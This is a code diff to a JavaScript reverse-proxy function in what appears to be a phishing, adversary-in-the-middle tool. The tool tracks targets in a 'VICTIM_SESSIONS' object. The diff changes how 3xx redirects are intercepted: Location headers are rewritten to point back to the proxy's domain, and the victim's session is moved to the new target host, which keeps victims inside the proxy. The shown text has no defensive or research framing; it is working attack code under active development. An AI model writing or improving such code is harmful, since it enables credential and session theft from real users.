@@ -393,24 +393,24 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);
 
         // ---- REWRITE ALL 3xx REDIRECTS (CORS + NAVIGATION + ANY HOST) ----
-if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
+if (isNavigationRequest &&
+    proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
+    proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
     const proxyResponseLocation = proxyResponse.headers.location;
     if (proxyResponseLocation) {
         try {
             const locationURL = new URL(proxyResponseLocation);
-            console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
+            console.log(`[REDIRECT REWRITE] Original: ${proxyResponseLocation}`);
             
-            // Update session to the target host (important for subsequent requests)
             VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
             VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
             VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
             VICTIM_SESSIONS[currentSession].port = locationURL.port;
             VICTIM_SESSIONS[currentSession].host = locationURL.host;
 
-            // Rewrite Location to point back to your proxy domain
             const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
             proxyResponse.headers.location = rewritten;
-            console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
+            console.log(`[REDIRECT REWRITE] Rewritten: ${rewritten}`);
         } catch (error) {
             VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
             console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
